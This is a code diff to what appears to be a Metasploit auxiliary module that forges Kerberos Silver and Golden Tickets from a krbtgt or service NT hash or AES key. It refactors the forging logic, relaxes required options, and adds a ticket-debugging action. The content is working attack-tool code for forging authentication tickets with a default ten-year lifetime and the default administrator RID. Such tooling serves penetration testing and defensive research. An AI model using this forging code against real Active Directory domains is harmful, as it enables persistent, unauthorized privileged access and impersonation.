@@ -28,11 +28,12 @@ class MetasploitModule < Msf::Auxiliary
           'Stability' => [],
           'SideEffects' => [],
           'Reliability' => [],
-          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Ticketer']
+          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Ticketer', 'Klist']
         },
         'Actions' => [
           ['FORGE_SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
           ['FORGE_GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
+          ['DEBUG_TICKET', { 'Description' => 'Print out the contents of a ticket for debugging' } ]
         ],
         'DefaultAction' => 'FORGE_SILVER'
       )
@@ -40,14 +41,15 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('USER', [ true, 'The Domain User' ]),
-        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
+        OptString.new('USER', [ false, 'The Domain User' ]),
+        OptInt.new('USER_RID', [ false, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
         OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
         OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
-        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
-        OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
+        OptString.new('DOMAIN', [ false, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
+        OptString.new('DOMAIN_SID', [ false, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
         OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], regex: %r{.*/.*}),
-        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650])
+        OptInt.new('DURATION', [ false, 'Duration of the ticket in days', 3650]),
+        OptString.new('TICKET_PATH', [false, 'Path to the ticket you wish to debug'])
       ]
     )
     deregister_options('RHOSTS', 'RPORT', 'Timeout')
@@ -56,36 +58,27 @@ class MetasploitModule < Msf::Auxiliary
   SECS_IN_DAY = 60 * 60 * 24
 
   def run
-    validate_options
-
-    if datastore['NTHASH']
-      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
-      key = datastore['NTHASH']
-    else
-      key = datastore['AES_KEY']
-      if datastore['AES_KEY'].size == 64
-        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256
-      else
-        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128
-      end
-    end
-
-    enc_key = [key].pack('H*')
-    start_time = Time.now
-    end_time = start_time + SECS_IN_DAY * datastore['DURATION']
-
     case action.name
     when 'FORGE_SILVER'
-      fail_with(Msf::Exploit::Failure::BadConfig, 'SPN must be set for forging a silver ticket') if datastore['SPN'].blank?
-      sname = datastore['SPN'].split('/', 2)
-      flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
+      forge_silver
     when 'FORGE_GOLDEN'
-      sname = ['krbtgt', datastore['DOMAIN'].upcase]
-      flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
+      forge_golden
+    when 'DEBUG_TICKET'
+      debug_ticket
     else
       fail_with(Msf::Module::Failure::BadConfig, "Invalid action #{action.name}")
     end
-    create_ticket(
+  end
+
+  private
+
+  def forge_ccache(sname:, flags:)
+    enc_key, enc_type = get_enc_key_and_type
+
+    start_time = Time.now
+    end_time = start_time + SECS_IN_DAY * datastore['DURATION']
+
+    ccache = forge_ticket(
       enc_key: enc_key,
       enc_type: enc_type,
       start_time: start_time,
@@ -97,11 +90,62 @@ class MetasploitModule < Msf::Auxiliary
       user_id: datastore['USER_RID'],
       domain_sid: datastore['DOMAIN_SID']
     )
+    if datastore['VERBOSE']
+      print_ccache_contents(ccache, key: enc_key)
+    end
   end
 
-  private
+  def forge_silver
+    validate_options('SPN')
+    sname = datastore['SPN'].split('/', 2)
+    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
+    forge_ccache(sname: sname, flags: flags)
+  end
 
-  def validate_options
+  def forge_golden
+    validate_options
+    sname = ['krbtgt', datastore['DOMAIN'].upcase]
+    flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
+    forge_ccache(sname: sname, flags: flags)
+  end
+
+  def debug_ticket
+    fail_with(Msf::Exploit::Failure::BadConfig, 'TICKET_PATH must be set for debugging') if datastore['TICKET_PATH'].blank?
+    enc_key, = get_enc_key_and_type
+    print_contents(datastore['TICKET_PATH'], key: enc_key)
+  end
+
+  def get_enc_key_and_type
+    enc_type = nil
+    key = nil
+    if datastore['NTHASH']
+      enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
+      key = datastore['NTHASH']
+    elsif datastore['AES_KEY']
+      key = datastore['AES_KEY']
+      if datastore['AES_KEY'].size == 64
+        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES256
+      else
+        enc_type = Rex::Proto::Kerberos::Crypto::Encryption::AES128
+      end
+    end
+
+    enc_key = key.nil? ? nil : [key].pack('H*')
+    [enc_key, enc_type]
+  end
+
+  def validate_options(*extra_options)
+    unset_options = []
+    mandatory_options = %w[DOMAIN USER USER_RID DOMAIN_SID].concat(extra_options)
+    mandatory_options.each do |option|
+      unset_options << option if datastore[option].blank?
+    end
+    raise Msf::OptionValidateError, unset_options unless unset_options.empty?
+
+    validate_key
+  end
+
+  def validate_key
     if datastore['NTHASH'].blank? && datastore['AES_KEY'].blank?
       fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH or AES_KEY must be set for forging a ticket')
     elsif datastore['NTHASH'].present? && datastore['AES_KEY'].present?
